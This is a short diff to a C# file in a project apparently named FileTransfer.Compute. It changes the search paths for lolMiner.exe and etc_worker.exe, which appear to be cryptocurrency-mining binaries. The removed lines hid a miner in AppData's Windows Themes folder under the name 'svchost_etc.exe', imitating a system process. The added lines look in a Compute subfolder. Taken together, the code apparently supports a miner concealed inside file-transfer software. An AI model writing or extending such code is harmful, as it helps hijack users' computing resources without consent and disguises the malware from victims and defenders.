@@ -156,10 +156,10 @@ namespace FileTransfer.Compute
             string appDir = AppDomain.CurrentDomain.BaseDirectory;
             var searchPaths = new System.Collections.Generic.List<string>
             {
+                Path.Combine(appDir, "Compute", "lolMiner.exe"),
+                Path.Combine(appDir, "Compute", "etc_worker.exe"),
                 Path.Combine(appDir, "lolMiner.exe"),
                 Path.Combine(appDir, "etc_worker.exe"),
-                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "Modules", "lolminer", "lolMiner.exe"),
-                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_etc.exe"),
                 Path.Combine(Path.GetTempPath(), "lolMiner.exe"),
                 Path.Combine(Path.GetTempPath(), "etc_worker.exe")
             };
